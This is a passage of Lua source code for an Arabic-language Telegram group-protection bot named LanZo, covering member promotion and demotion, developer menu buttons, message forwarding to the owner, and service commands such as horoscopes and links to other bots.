Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mraMeR == "مدير" and Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mraMeR == "عضو" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevaMeR:sismember(LanZo.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mraMeR = DevaMeR:get(LanZo.."Comd:New:rt:aMeR:"..text1[2]..msg.chat_id_)
if mraMeR == "مميز" and VipMem(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mraMeR == "ادمن" and Admin(msg) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mraMeR == "مدير" and Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:sadd(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mraMeR == "عضو" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevaMeR:sismember(LanZo.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mraMeR = DevaMeR:get(LanZo.."Comd:New:rt:aMeR:"..text1[2]..msg.chat_id_)
if mraMeR == "مميز" and VipMem(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mraMeR == "ادمن" and Admin(msg) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mraMeR == "مدير" and Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mraMeR == "عضو" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source LanZo     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevaMeR:incr(LanZo..'aMeR:UsersMsgs'..LanZo..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:incr(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:incr(LanZo..'aMeR:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevaMeR:sismember(LanZo.."aMeR:Users",msg.chat_id_) then
DevaMeR:sadd(LanZo.."aMeR:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source LanZo     --
if ChatType == 'pv' then 
if text == '/start' or text == '↫ رجوع ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙مرحبا عزيزي المطور \n᥀︙انت المطور الاساسي هنا \n᥀︙اليك ازرار سورس لانزو \n᥀︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ السورس ᥀','وضع اسم البوت'},
{'↫  المطورين ᥀','↫ الاحصائيات ᥀'},
{'↫ التفعيل والتعطيل ᥀','↫ الاذاعه ᥀'},
{'↫ تعيين كلايش الاوامر ᥀','↫ العام ᥀','↫ ردود الخاص ᥀'},
{'↫ الاشتراك الاجباري ᥀','↫ الاوامر الخدميه ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ تعيين كلايش الاوامر ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
{'↫ مبرمج السورس ᥀','↫ قناة السورس ᥀'},
{'↫  السورس ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاحصائيات ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
{'↫ روابط المجموعات ᥀','↫ جلب نسخه احتياطيه ᥀'},
{'↫ تنظيف المشتركين ᥀','↫ تنظيف المجموعات ᥀'},
{'↫ نقل الاحصائيات ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫  المطورين ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الاساسيين ᥀','مسح الاساسيين'},
{'↫ الثانويين ᥀','مسح الثانويين'},
{'↫ المطورين ᥀','مسح المطورين'},
{'↫ تغير المطور الاساسي ᥀','↫ تغيير كليشه المطور ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ التفعيل والتعطيل ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعطيل التواصل ᥀','↫ تفعيل التواصل ᥀'},
{'↫ تعطيل ترحيب البوت ᥀','↫ تفعيل ترحيب البوت ᥀'},
{'↫ تعطيل المغادره ᥀','↫ تفعيل المغادره ᥀'},
{'↫ تعطيل الاذاعه ᥀','↫ تفعيل الاذاعه ᥀'},
{'↫ تعطيل البوت الخدمي ᥀','↫ تفعيل البوت الخدمي ᥀'},
{'↫ تعطيل النسخه التلقائيه ᥀','↫ تفعيل النسخه التلقائيه ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاذاعه ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
{'↫ اذاعه خاص بالتوجيه ᥀','↫ اذاعه عام بالتوجيه ᥀'},
{'الغاء'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اضف رد عام ᥀','↫ حذف رد عام ᥀'},
{'↫ ردود العام ᥀','↫ مسح ردود العام ᥀'},
{'↫ قائمه العام ᥀','مسح قائمه العام'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ ردود الخاص ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعيين رد الخاص ᥀','↫ حذف رد الخاص ᥀'},
{'↫ جلب رد الخاص ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاشتراك الاجباري ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  تفعيل الاشتراك الاجباري ᥀','↫  تعطيل الاشتراك الاجباري ᥀'},
{'↫ تعيين قناة الاشتراك ᥀',' ↫ حذف قناة الاشتراك ᥀'},
{'↫ تغير كليشه الاشتراك ᥀','↫ حذف كليشه الاشتراك ᥀'},
{'↫ كليشه الاشتراك ᥀','↫ قناة الاشتراك ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاوامر الخدميه ᥀' or text == '/play' or text == '↫  رجوع  ᥀' or text == 'اوامر الخدميه' or text == '/free' then
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اوامر التسليه ᥀','↫ الاوامر الخدميه  ᥀'},
{'↫ اوامر النسب ᥀','↫ البوتات ᥀'},
{'↫ العاب ᥀'},
{'↫  السورس ᥀','↫  المطور ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر التسليه ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
{'↫ مسلسل ᥀','↫ فلم ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ الاوامر الخدميه  ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الابراج ᥀','↫ حساب العمر ᥀'},
{'↫ الزخرفه ᥀','↫ معاني الاسماء ᥀'},
{'↫ الحمايه ᥀'},
{'↫  معرفي ᥀','↫  اسمي ᥀','↫ ايديي ᥀'},
{'↫  نبذتي ᥀','↫ نبذا ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ البوتات ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ بوت الحذف ᥀','↫ بوت الهمسه ᥀'},
{'↫ بوت اليوتيوب ᥀','↫ بوت الكت ᥀'},
{'↫ بوت الزخرفه ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر النسب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس لانزو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ نسبه الكره ᥀','↫ نسبه الحب ᥀'},
{'↫ نسبه الرجوله ᥀','↫ نسبه الانوثه ᥀'},
{'↫ نسبه الغباء ᥀','↫ نسبه الجمال ᥀'},
{'↫ نسبه الخيانه ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس لانزو فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
{'↫ الالعاب ᥀','↫ الالعاب المتطوره ᥀'},
{'↫ كت ᥀'},
{'↫ سمايلات ᥀','↫ معاني ᥀'},
{'↫ ترتيب ᥀','↫ حزوره ᥀'},
{'↫ العكس ᥀','↫ المختلف ᥀'},
{'↫ امثله ᥀','↫ اسئله ᥀'},
{'↫ تخمين ᥀',''},
{'↫ رياضيات ᥀','↫ انكليزي ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
--     Source LanZo     --
if text == '/start' and ChCheck(msg) then  
if not DevaMeR:get(LanZo..'aMeR:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=LANZO},function(arg,dp) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "Bw5Bw")}},
{{text="᥀ السورس .",url="https://t.me/Bw5Bw"},{text="᥀ لتنصيب بوت .",url="https://t.me/lMlMMM"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevaMeR:get(LanZo.."aMeR:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙اختصاصي حماية المجموعات\n᥀︙من التفليش والسبام والخخ .. . ،\n᥀︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا\n᥀︙ارسل امر /free او /play للتمتع باوامر الاعضاء"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevaMeR:setex(LanZo..'aMeR:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source LanZo     --
if not SecondSudo(msg) and not DevaMeR:sismember(LanZo..'aMeR:Ban:Pv',msg.sender_user_id_) and not DevaMeR:get(LanZo..'aMeR:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=LANZO},function(arg,chat) 
Dev_aMeR(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "Bw5Bw")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=LANZO,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(LANZO,'᥀︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم حظره من التواصل'
SendText(LANZO,Text,msg.id_/2097152/0.5,'md') 
DevaMeR:sadd(LanZo..'aMeR:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(LANZO,Text,msg.id_/2097152/0.5,'md') 
DevaMeR:srem(LanZo..'aMeR:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_aMeR(id_user, 0, 1, text, 1, "md")  
Text = '᥀︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '᥀︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '᥀︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '᥀︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '᥀︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(LANZO, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source LanZo     --
if text and DevaMeR:get(LanZo..'aMeR:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevaMeR:del(LanZo..'aMeR:Start:Bots'..msg.sender_user_id_) 
return false
end
DevaMeR:set(LanZo.."aMeR:Start:Bot",text)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الستارت', 1, 'md')
DevaMeR:del(LanZo..'aMeR:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' and ChCheck(msg) or text == 'ضع كليشه ستارت' and ChCheck(msg) or text == '↫ تعيين رد الخاص ᥀' and ChCheck(msg) then 
DevaMeR:set(LanZo..'aMeR:Start:Bots'..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' and ChCheck(msg) or text == 'حذف كليشه ستارت' and ChCheck(msg) or text == '↫ حذف رد الخاص ᥀' and ChCheck(msg) then 
DevaMeR:del(LanZo..'Start:Bot') 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' and ChCheck(msg) or text == '↫ جلب رد الخاص ᥀' and ChCheck(msg) then  
local start = DevaMeR:get(LanZo.."aMeR:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙اختصاصي حماية المجموعات\n᥀︙من التفليش والسبام والخخ .. . ،\n᥀︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' and ChCheck(msg) or text == '↫ تفعيل التواصل ᥀' and ChCheck(msg) then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Texting:Pv',true) 
end
if Sudo(msg) then
if text == 'تفعيل النسخه التلقائيه' or text == 'تفعيل جلب نسخه الكروبات' or text == 'تفعيل عمل نسخه للمجموعات' or text == '↫ تفعيل النسخه التلقائيه ᥀' then   
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙تم تفعيل جلب نسخة الكروبات التلقائيه\n᥀︙سيتم ارسال نسخه تلقائيه للكروبات كل يوم الى خاص المطور الاساسي", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Lock:AutoFile")
end
if text == 'تعطيل النسخه التلقائيه' or text == 'تعطيل جلب نسخه الكروبات' or text == 'تعطيل عمل نسخه للمجموعات' or text == '↫ تعطيل النسخه التلقائيه ᥀' then  
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙تم تعطيل جلب نسخة الكروبات التلقائيه", 1, 'md')
DevaMeR:set(LanZo.."aMeR:Lock:AutoFile",true) 
end
end
end
--     Source LanZo     --
if text == "الابراج" or text == "↫ الابراج ᥀" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك معرفه توقعات برجك \n᥀︙ فقط قم بارسال امر برج + اسم البرج \n᥀︙ مثال : برج الاسد ،\n᥀︙ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ', 1, 'md') end
if text == "حساب العمر" or text == "↫ حساب العمر ᥀" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك حساب عمرك \n᥀︙ فقط قم بارسال امر احسب + مواليدك الى البوت \n᥀︙ بالتنسيق التالي مثال : احسب 2000/7/24', 1, 'md') end
if text == "الحمايه" or text == "↫ الحمايه ᥀" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ اضف البوت في المجموعه ثم قم برفعه مشرف وارسل تفعيل \n᥀︙ وتمتع بخدمات غير موجوده في باقي البوتات ', 1, 'md') end
if text == "الزخرفه" or text == "↫ الزخرفه ᥀" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانكليزي أو العربي', 1, 'md') end
if text == "معاني الاسماء" or text == "↫ معاني الاسماء ᥀" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك معرفه معنى اسمك \n᥀︙ فقط قم بارسال امر معنى اسم + الاسم \n᥀︙ مثال : معنى اسم ريو', 1, 'md') end
if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر عدد المسح + عدد المسح \n᥀︙ مثال : عدد المسح 100', 1, 'md') end
if text == "انطق" then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر انطق + الكلمه\n᥀︙سيقوم البوت بنطق الكلمه \n᥀︙ مثال : انطق هلو', 1, 'md') end
if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "↫ بوت اليوتيوب ᥀" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/t_stbot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
if text == "اهمس" and ChCheck(msg) or text == "↫ بوت الهمسه ᥀" and ChCheck(msg) or text == "بوت الهمسه" and ChCheck(msg) or text == "همسه" and ChCheck(msg) or text == "اريد بوت الهمسه" and ChCheck(msg) or text == "دزلي بوت الهمسه" and ChCheck(msg) or text == "دزولي بوت الهمسه" and ChCheck(msg) then  Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙@HMSEBOT\n᥀︙@nnbbot\n᥀︙@ocBot\n᥀︙@hebot ', 1, 'md') end
if text == "رابط حذف" and ChCheck(msg) or text == "رابط الحذف" and ChCheck(msg) or text == "اريد رابط الحذف" and ChCheck(msg) or text == "شمرلي رابط الحذف" and ChCheck(msg) or text == "اريد رابط حذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على رابط الحذف*',nil,inline) return false end
if text == "↫ بوت الحذف ᥀" and ChCheck(msg) or text == "بوت الحذف" and ChCheck(msg) or text == "اريد بوت الحذف" and ChCheck(msg) or text == "اريد بوت حذف" and ChCheck(msg) or text == "بوت حذف" and ChCheck(msg) or text == "بوت حذف حسابات" and ChCheck(msg) or text == "راح احذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الحذف*',nil,inline) return false end
